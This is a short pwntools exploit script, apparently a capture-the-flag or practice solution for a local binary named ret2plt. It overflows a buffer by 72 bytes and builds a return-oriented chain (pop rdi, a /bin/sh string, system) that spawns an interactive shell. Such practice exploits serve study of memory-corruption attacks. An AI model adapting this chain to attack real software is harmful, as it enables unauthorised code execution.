from pwn import *

context.binary=elf=ELF("./ret2plt")

p=process(elf.path)

print(p.recv())

offset=64+8
system=elf.sym.system
binsh=elf.sym.binsh
pop_rdi=elf.sym.pop_rdi_ret
ret=ROP(elf).find_gadgets(["ret"])[0]

payload=flat(
    b'a'*offset,
    p64(pop_rdi),p64(binsh),
    p64(system)
)

p.sendline(payload)

p.interactive()
